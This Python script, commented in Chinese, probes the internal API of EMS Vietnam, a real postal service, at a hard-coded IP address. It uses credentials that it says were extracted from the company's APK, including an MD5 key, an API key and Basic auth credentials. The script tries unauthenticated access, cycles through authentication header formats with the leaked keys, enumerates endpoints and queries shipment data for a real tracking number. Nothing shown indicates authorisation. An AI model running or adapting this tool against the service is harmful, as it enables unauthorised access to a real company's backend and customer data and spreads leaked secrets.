#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
测试 EMS 内部API和硬编码密钥
"""

import requests
import hashlib
import json
from datetime import datetime

print("=" * 80)
print("EMS 内部API测试工具")
print("=" * 80)

# 从APK中提取的敏感信息
INTERNAL_API = "http://113.190.232.99:8003/api/"
MD5_KEY = "B3EEABB8EE11C2BE770B684D95219ECB"
PUBLIC_API_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="  # lottnet:dms

# 测试用运单号
TEST_TRACKING = "EP493018285VN"

def test_1_basic_access():
    """测试1: 基础访问（无认证）"""
    print("\n🔍 测试 1: 基础访问（无认证）")
    print("-" * 80)
    
    try:
        r = requests.get(INTERNAL_API, timeout=10)
        print(f"状态码: {r.status_code}")
        print(f"响应头: {dict(r.headers)}")
        print(f"响应体: {r.text[:200]}")
        return r.status_code == 200
    except Exception as e:
        print(f"❌ 错误: {e}")
        return False

def test_2_md5_key():
    """测试2: 使用MD5密钥"""
    print("\n🔍 测试 2: 使用MD5密钥")
    print("-" * 80)
    
    methods = [
        {'X-API-Key': MD5_KEY},
        {'Authorization': f'Bearer {MD5_KEY}'},
        {'Authorization': f'Token {MD5_KEY}'},
        {'apikey': MD5_KEY},
    ]
    
    for i, headers in enumerate(methods, 1):
        try:
            print(f"\n  方法 {i}: {headers}")
            r = requests.get(INTERNAL_API, headers=headers, timeout=10)
            print(f"  状态码: {r.status_code}")
            if r.status_code != 403 and r.status_code != 401:
                print(f"  ✓ 可能有效! 响应: {r.text[:200]}")
                return True
        except Exception as e:
            print(f"  ❌ 错误: {e}")
    
    return False

def test_3_public_credentials():
    """测试3: 使用公开API凭证"""
    print("\n🔍 测试 3: 使用公开API凭证")
    print("-" * 80)
    
    headers = {
        'Authorization': f'Basic {BASIC_AUTH}',
        'APIKey': PUBLIC_API_KEY,
        'Content-Type': 'application/json'
    }
    
    try:
        r = requests.get(INTERNAL_API, headers=headers, timeout=10)
        print(f"状态码: {r.status_code}")
        print(f"响应: {r.text[:200]}")
        return r.status_code == 200
    except Exception as e:
        print(f"❌ 错误: {e}")
        return False

def test_4_enumerate_endpoints():
    """测试4: 枚举常见端点"""
    print("\n🔍 测试 4: 枚举常见端点")
    print("-" * 80)
    
    endpoints = [
        'login', 'auth', 'token',
        'orders', 'tracking', 'parcels',
        'location', 'gps', 'position',
        'upload', 'image', 'photo',
        'profile', 'user', 'account',
        'health', 'status', 'ping',
        'api-docs', 'swagger', 'docs',
        'v1', 'v2', 'version'
    ]
    
    found = []
    
    for ep in endpoints:
        try:
            r = requests.get(f"{INTERNAL_API}{ep}", timeout=5)
            if r.status_code != 404:
                print(f"  ✓ 找到: /{ep} - {r.status_code}")
                found.append((ep, r.status_code))
        except:
            pass
    
    if found:
        print(f"\n找到 {len(found)} 个可访问的端点:")
        for ep, code in found:
            print(f"  - {ep}: {code}")
        return True
    else:
        print("  未找到可访问的端点")
        return False

def test_5_combined_request():
    """测试5: 组合所有凭证的请求"""
    print("\n🔍 测试 5: 组合所有凭证")
    print("-" * 80)
    
    headers = {
        'Authorization': f'Basic {BASIC_AUTH}',
        'X-API-Key': MD5_KEY,
        'APIKey': PUBLIC_API_KEY,
        'Content-Type': 'application/json'
    }
    
    # 尝试不同的HTTP方法
    methods = ['GET', 'POST', 'PUT']
    
    for method in methods:
        try:
            print(f"\n  {method} 请求:")
            if method == 'GET':
                r = requests.get(INTERNAL_API, headers=headers, timeout=10)
            elif method == 'POST':
                r = requests.post(INTERNAL_API, headers=headers, json={}, timeout=10)
            else:
                r = requests.put(INTERNAL_API, headers=headers, json={}, timeout=10)
            
            print(f"    状态码: {r.status_code}")
            if r.status_code == 200:
                print(f"    ✓ 成功! 响应: {r.text[:200]}")
                return True
        except Exception as e:
            print(f"    ❌ 错误: {e}")
    
    return False

def test_6_tracking_query():
    """测试6: 尝试查询运单（使用内部API）"""
    print("\n🔍 测试 6: 查询运单（内部API）")
    print("-" * 80)
    
    # 尝试不同的端点和参数组合
    endpoints = [
        ('orders', {'tracking': TEST_TRACKING}),
        ('tracking', {'code': TEST_TRACKING}),
        ('parcels', {'parcel_code': TEST_TRACKING}),
        ('query', {'tracking_number': TEST_TRACKING}),
    ]
    
    headers = {
        'X-API-Key': MD5_KEY,
        'Content-Type': 'application/json'
    }
    
    for ep, params in endpoints:
        try:
            url = f"{INTERNAL_API}{ep}"
            print(f"\n  POST {url}")
            print(f"  参数: {params}")
            
            r = requests.post(url, headers=headers, json=params, timeout=10)
            print(f"  状态码: {r.status_code}")
            
            if r.status_code == 200:
                print(f"  ✓ 成功!")
                try:
                    data = r.json()
                    print(f"  响应: {json.dumps(data, indent=2, ensure_ascii=False)[:500]}")
                except:
                    print(f"  响应: {r.text[:200]}")
                return True
        except Exception as e:
            print(f"  ❌ 错误: {e}")
    
    return False

def test_7_public_api():
    """测试7: 验证公开API（对比）"""
    print("\n🔍 测试 7: 验证公开API（作为对比）")
    print("-" * 80)
    
    sig = hashlib.sha256((TEST_TRACKING.upper() + PUBLIC_API_KEY).encode()).hexdigest().upper()
    
    headers = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PUBLIC_API_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "ParcelCode": TEST_TRACKING,
        "Signature": sig
    }
    
    try:
        r = requests.post(
            "https://api-dingdong.ems.com.vn/api/Delivery/Inquiry",
            headers=headers,
            data=data,
            timeout=10
        )
        
        print(f"状态码: {r.status_code}")
        
        if r.status_code == 200:
            result = r.json()
            print(f"✓ 公开API工作正常")
            print(f"响应码: {result.get('Code')}")
            print(f"消息: {result.get('Message')}")
            return True
    except Exception as e:
        print(f"❌ 错误: {e}")
    
    return False

def main():
    print(f"\n开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"\n目标:")
    print(f"  内部API: {INTERNAL_API}")
    print(f"  公开API: https://api-dingdong.ems.com.vn/")
    print(f"  测试运单: {TEST_TRACKING}")
    
    results = []
    
    # 执行所有测试
    tests = [
        test_1_basic_access,
        test_2_md5_key,
        test_3_public_credentials,
        test_4_enumerate_endpoints,
        test_5_combined_request,
        test_6_tracking_query,
        test_7_public_api,
    ]
    
    for test_func in tests:
        try:
            result = test_func()
            results.append((test_func.__name__, result))
        except Exception as e:
            print(f"\n❌ 测试失败: {e}")
            results.append((test_func.__name__, False))
    
    # 总结
    print("\n" + "=" * 80)
    print("测试总结")
    print("=" * 80)
    
    for test_name, result in results:
        status = "✅ 通过" if result else "❌ 失败"
        print(f"{status} - {test_name}")
    
    success_count = sum(1 for _, r in results if r)
    print(f"\n总计: {success_count}/{len(results)} 测试通过")
    
    print("\n" + "=" * 80)
    print("结论:")
    print("=" * 80)
    
    if results[0][1]:  # 基础访问成功
        print("⚠️  内部API可以无认证访问！这是严重的安全隐患。")
    elif results[1][1]:  # MD5密钥有效
        print("⚠️  MD5密钥有效！可以使用此密钥访问API。")
    elif results[3][1]:  # 找到端点
        print("⚠️  发现可访问的端点，需要进一步测试。")
    elif results[6][1]:  # 只有公开API工作
        print("✓ 内部API无法访问，只有公开API可用。")
    else:
        print("❌ 所有测试都失败了，可能需要：")
        print("   1. 检查网络连接")
        print("   2. 内部API可能仅限内网访问")
        print("   3. 需要额外的认证步骤")
    
    print("\n完成时间: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

if __name__ == '__main__':
    main()
